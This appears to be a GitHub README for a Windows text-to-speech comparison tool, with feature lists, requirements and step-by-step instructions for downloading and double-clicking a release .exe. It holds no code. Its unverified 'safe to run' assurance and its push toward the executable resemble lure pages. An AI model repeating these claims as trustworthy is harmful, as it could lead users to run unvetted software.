# 🎙️ tts-lab - Compare and test speech models easily

[![](https://img.shields.io/badge/Download_TTS_Lab-blue.svg)](https://github.com/assailabilitytoy38/tts-lab)

TTS Lab provides a simple way to turn text into spoken audio. You can test different voices and styles on your own computer. Choose from many high-quality models, listen to the output, and save your favorite clips.

## 🛠️ What You Can Do

TTS Lab organizes complex technology into a clear interface. You do not need to write code to use it.

- Pick between many text-to-speech engines like Kokoro, Piper, and F5-TTS.
- See exactly how long the computer takes to process your text.
- View a live chart of the audio frequencies.
- Save your generated speech as professional WAV audio files.
- Compare how different voices sound side by side.
- Keep one model ready to go for quick testing.

## 📋 System Requirements

To run this tool on your Windows computer, make sure you have these items installed:

- Windows 10 or Windows 11.
- A modern processor with at least 8GB of RAM.
- A stable internet connection for the first download of the program and the speech models.
- Python 3.8 or newer. This is necessary for the background engines to function.
- Bun 1.3 or higher. This manages the main application workflow.

If you do not have Python or Bun, you can download them from their official websites. These are standard tools that many applications use.

## 📥 How to Install and Start

Follow these steps to set up the lab on your machine.

1. Visit the project website at [https://github.com/assailabilitytoy38/tts-lab](https://github.com/assailabilitytoy38/tts-lab).
2. Look for the "Releases" section on the right side of the page.
3. Click the latest version to see the available files.
4. Download the installer file that ends in .exe.
5. Double-click the file to start the installation.
6. Follow the instructions on your screen.
7. Once the installation finishes, find the TTS Lab icon on your desktop or in your start menu.
8. Click the icon to open the main window.

The first time you open the lab, it may take a few moments to initialize the internal settings. This is normal.

## ⚙️ How to Generate Speech

After you open the lab, follow this sequence to create your first audio file:

1. Select a model from the top dropdown menu. Each model has a unique way of speaking.
2. Choose a voice from the list provided for that specific model.
3. Type your text into the large box in the center of the screen.
4. Click the "Generate" button.
5. Wait for the progress bar to show the status.
6. Once it finishes, the audio player becomes active.
7. Click "Play" to listen to your generated voice.
8. Click the "Save" button to move the file from the lab to your computer folders.

The status window shows how fast the generation moved. You can use these numbers to compare how different models perform on your specific hardware.

## 📊 Monitoring Performance

The lab keeps track of the data for you. When you generate audio, the software records the time it took to create the sound. 

- Total time elapsed.
- The average speed of the process.
- How much memory the model used during the session.

These stats help you understand which models work best for your needs. If you find a model that sounds natural and works fast, you can mark it as your favorite.

## 🔍 Troubleshooting

Sometimes a model might fail to load. This usually happens if the file download did not complete.

- Check your internet connection.
- Restart the program.
- If a model still does not load, go to the "Downloads" tab in the app.
- Click "Verify Files" to check that all pieces are present.
- If a file is missing, click "Download" to fetch it again.

The lab verifies all downloads automatically using check codes. This prevents corrupted files from crashing your application.

## 📝 Frequently Asked Questions

**Do I need a powerful computer to run this?**
You need a standard modern computer. You do not need a high-end graphics card, but more RAM helps with larger models.

**Can I use my own models?**
The lab is designed for supported models. You can request new models by visiting the link above and leaving a message in the issues section.

**How do I save my audio?**
Every time you generate speech, the app saves a temporary file. Clicking the export button lets you pick where to keep the file permanently on your hard drive.

**Is it safe to run?**
The software runs locally on your machine. Your text and your audio files do not leave your computer. You remain in control of your data at all times.
